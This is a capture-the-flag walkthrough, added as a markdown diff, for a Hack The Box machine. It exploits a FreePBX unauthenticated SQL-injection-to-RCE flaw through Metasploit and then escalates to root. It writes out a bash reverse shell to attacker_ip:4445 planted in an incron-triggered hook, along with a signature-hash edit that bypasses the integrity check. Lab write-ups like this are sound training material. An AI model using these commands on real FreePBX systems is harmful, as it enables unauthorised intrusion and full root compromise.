@@ -1,0 +1,63 @@
+# Hello guys today we'll try to solve the HTB machine "Connected".
+
+1st step we'll do is scan the target_ip.
+idk about you but but imma go straight to port 80 and see if i find any vuln in the source code.
+So we found a FreePBX vuln!
+let's try to Exploit it!!!
+
+For this you can write a custome python script to get a REV-Shell but i'm lazy so i'll use msfconsole!!!!!!
+
+1st lets search for FreePBX vulnerability in msfconsole and see what pops-up.
+For this vuln we'll use ajax.php unauthenticated SQLi to RCE.
+Let's quickly setup this module and start exploiting.
+I always use the check command before attempting to exploit any target just to make sure i've everything in place, YEP everything looks perfect
+now let's get our hands dirty!!
+
+Great, we sucessfully Exploited our target and got a REV-Shell.
+Type ls and There you have it User flag!
+
+cat /user.txt
+# Output: ***********************************
+
+Now let's find the root flag. 
+
+Prerequisites:
+
+You have a Meterpreter session as asterisk.
+You have a Netcat listener running on port 4445. 
+Step 1: Switch to a System Shell because You cannot run Linux commands like cat, sha256sum, or touch directly in the Meterpreter prompt. 
+You must enter a shell first. 
+
+
+meterpreter > shell
+
+Step 2: Write the Payload
+Create the malicious hook file with your reverse shell payload. 
+
+command:
+cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/attacker_ip/4445 0>&1
+EOF
+
+Step 3: Update the Signature Hash
+The system checks the file integrity. You must update module.sig with the hash of the file you just created. 
+
+command:
+NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
+sed -i "s|hooks/logrotate = .*|hooks/logrotate = $NEW_HASH|" /var/www/html/admin/modules/ucp/module.sig
+
+Step 4: Trigger the Exploit
+Touch the monitored file to trigger the incron watcher, which executes your payload as root. 
+
+command:
+touch /var/spool/asterisk/incron/ucp.logrotate
+
+Step 5: Retrieve the Flag
+Check your Netcat listener on port 4445.  You should receive a root shell immediately. Run:
+
+id
+# Output should be: uid=0(root) gid=0(root)
+
+cat /root/root.txt
+# Output: ***********************************
